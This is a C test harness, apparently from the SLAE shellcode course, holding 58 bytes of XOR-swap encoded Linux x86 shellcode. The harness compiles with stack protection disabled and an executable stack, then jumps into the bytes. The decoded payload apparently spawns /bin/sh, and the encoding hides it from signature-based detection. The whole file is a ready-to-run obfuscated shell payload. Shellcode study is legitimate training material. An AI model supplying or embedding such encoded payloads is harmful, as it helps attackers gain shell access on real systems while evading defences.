/*
Tested on       : Linux/x86
Author          : Elham AlShehri
ID              : SLAE-1538
Shellcode Size  : 58 bytes
Description     : xor-swap encoded shellcode 

Test Using:
        gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/
#include<stdio.h>
#include<string.h>
unsigned char code[] ="\xeb\x19\x5e\x80\x36\xee\x80\x76\x01\xee\x74\x14\x8a\x1e\x8a\x46\x01\x88\x5e\x01\x88\x06\x83\xc6\x02\xeb\xe8\xe8\xe2\xff\xff\xff\x2e\xdf\x86\xbe\xc1\xc1\x86\x9d\xc1\x86\x87\x8c\x67\x80\xbe\x0d\x0c\x67\x3f\x67\xe5\x5e\x6e\x23\xee\xee";

int main(int argc, char *argv[])
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
